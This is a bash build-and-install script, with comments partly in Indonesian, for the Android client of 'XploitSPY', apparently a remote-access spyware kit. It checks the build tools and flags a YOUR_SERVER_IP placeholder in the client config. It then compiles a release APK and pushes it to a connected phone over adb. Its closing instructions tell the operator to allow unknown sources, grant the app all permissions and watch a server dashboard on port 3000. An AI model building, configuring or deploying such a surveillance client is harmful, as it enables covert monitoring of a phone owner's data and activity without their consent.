#!/bin/bash

# Script untuk Build dan Install APK ke Android Device

echo "========================================="
echo "   XploitSPY - Build & Install APK"
echo "========================================="
echo ""

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Check if we're in the right directory
if [ ! -d "client" ]; then
    echo -e "${RED}❌ Error: Jalankan script ini dari root directory proyek${NC}"
    exit 1
fi

cd client

# Step 1: Check Android SDK
echo "📱 Checking Android SDK..."
if [ -z "$ANDROID_HOME" ]; then
    # Try to find Android SDK in common locations
    if [ -d "$HOME/Android/Sdk" ]; then
        export ANDROID_HOME="$HOME/Android/Sdk"
        echo "   ✅ Found Android SDK at: $ANDROID_HOME"
    elif [ -d "$HOME/Library/Android/sdk" ]; then
        export ANDROID_HOME="$HOME/Library/Android/sdk"
        echo "   ✅ Found Android SDK at: $ANDROID_HOME"
    else
        echo -e "${YELLOW}⚠️  Android SDK not found!${NC}"
        echo ""
        echo "Please install Android Studio or set ANDROID_HOME:"
        echo "  export ANDROID_HOME=\$HOME/Android/Sdk"
        echo "  export PATH=\$PATH:\$ANDROID_HOME/tools"
        echo "  export PATH=\$PATH:\$ANDROID_HOME/platform-tools"
        echo ""
        read -p "Continue anyway? (y/n) " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
    fi
else
    echo "   ✅ ANDROID_HOME: $ANDROID_HOME"
fi

# Step 2: Check Java
echo ""
echo "☕ Checking Java..."
if ! command -v java &> /dev/null; then
    echo -e "${RED}❌ Java not found! Please install Java 11 or higher${NC}"
    exit 1
fi

JAVA_VERSION=$(java -version 2>&1 | head -1 | cut -d'"' -f2 | sed '/^1\./s///' | cut -d'.' -f1)
if [ "$JAVA_VERSION" -lt 11 ]; then
    echo -e "${YELLOW}⚠️  Java version is $JAVA_VERSION. Java 11+ recommended${NC}"
else
    echo "   ✅ Java version: $JAVA_VERSION"
fi

# Step 3: Check Gradle Wrapper
echo ""
echo "📦 Checking Gradle..."
if [ ! -f "gradlew" ]; then
    echo -e "${YELLOW}⚠️  Gradle wrapper not found. Creating...${NC}"
    # We'll try to use system gradle if available
    if command -v gradle &> /dev/null; then
        echo "   Using system Gradle"
        GRADLE_CMD="gradle"
    else
        echo -e "${RED}❌ Gradle not found! Please install Gradle${NC}"
        exit 1
    fi
else
    chmod +x gradlew
    GRADLE_CMD="./gradlew"
    echo "   ✅ Gradle wrapper found"
fi

# Step 4: Check Config
echo ""
echo "⚙️  Checking configuration..."
CONFIG_FILE="app/src/main/java/com/xploitspy/client/Config.java"
if grep -q "YOUR_SERVER_IP" "$CONFIG_FILE"; then
    echo -e "${YELLOW}⚠️  Config.java masih menggunakan placeholder!${NC}"
    echo ""
    read -p "Update Config.java sekarang? (y/n) " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        cd ../builder
        ./quick_config.sh
        cd ../client
    fi
fi

# Step 5: Build APK
echo ""
echo "🔨 Building APK..."
echo "   This may take a few minutes..."
echo ""

$GRADLE_CMD clean assembleRelease

if [ $? -ne 0 ]; then
    echo -e "${RED}❌ Build failed!${NC}"
    echo ""
    echo "Common issues:"
    echo "1. Android SDK not properly configured"
    echo "2. Missing dependencies"
    echo "3. Check build logs above"
    exit 1
fi

# Step 6: Find APK
APK_PATH="app/build/outputs/apk/release/app-release.apk"
if [ ! -f "$APK_PATH" ]; then
    echo -e "${RED}❌ APK not found at: $APK_PATH${NC}"
    exit 1
fi

APK_SIZE=$(du -h "$APK_PATH" | cut -f1)
echo ""
echo -e "${GREEN}✅ APK built successfully!${NC}"
echo "   Location: $APK_PATH"
echo "   Size: $APK_SIZE"
echo ""

# Step 7: Check for connected devices
echo "📱 Checking for connected Android devices..."
if ! command -v adb &> /dev/null; then
    echo -e "${YELLOW}⚠️  ADB not found in PATH${NC}"
    if [ -n "$ANDROID_HOME" ]; then
        export PATH=$PATH:$ANDROID_HOME/platform-tools
        echo "   Added Android SDK platform-tools to PATH"
    fi
fi

if command -v adb &> /dev/null; then
    DEVICES=$(adb devices | grep -v "List" | grep "device$" | wc -l | tr -d ' ')
    
    if [ "$DEVICES" -eq 0 ]; then
        echo -e "${YELLOW}⚠️  No Android devices connected via USB${NC}"
        echo ""
        echo "Options:"
        echo "1. Connect Android device via USB and enable USB debugging"
        echo "2. Install APK manually:"
        echo "   - Transfer APK to device"
        echo "   - Enable 'Install from Unknown Sources'"
        echo "   - Install APK"
        echo ""
        echo "APK location: $(pwd)/$APK_PATH"
    else
        echo -e "${GREEN}✅ Found $DEVICES connected device(s)${NC}"
        echo ""
        read -p "Install APK to device now? (y/n) " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            echo ""
            echo "📲 Installing APK..."
            adb install -r "$APK_PATH"
            
            if [ $? -eq 0 ]; then
                echo ""
                echo -e "${GREEN}✅ APK installed successfully!${NC}"
                echo ""
                echo "Next steps:"
                echo "1. Open the app on your device"
                echo "2. Grant all permissions"
                echo "3. Check dashboard: http://YOUR_SERVER_IP:3000"
            else
                echo -e "${RED}❌ Installation failed!${NC}"
                echo "Try installing manually or check device connection"
            fi
        else
            echo ""
            echo "APK ready at: $(pwd)/$APK_PATH"
            echo "Install manually or run: adb install $APK_PATH"
        fi
    fi
else
    echo -e "${YELLOW}⚠️  ADB not available${NC}"
    echo ""
    echo "APK ready at: $(pwd)/$APK_PATH"
    echo "Install manually on your Android device"
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "   📦 APK Location:"
echo "   $(pwd)/$APK_PATH"
echo ""
echo "   📝 To install manually:"
echo "   1. Transfer APK to Android device"
echo "   2. Enable 'Install from Unknown Sources'"
echo "   3. Open APK and install"
echo "   4. Grant all permissions"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

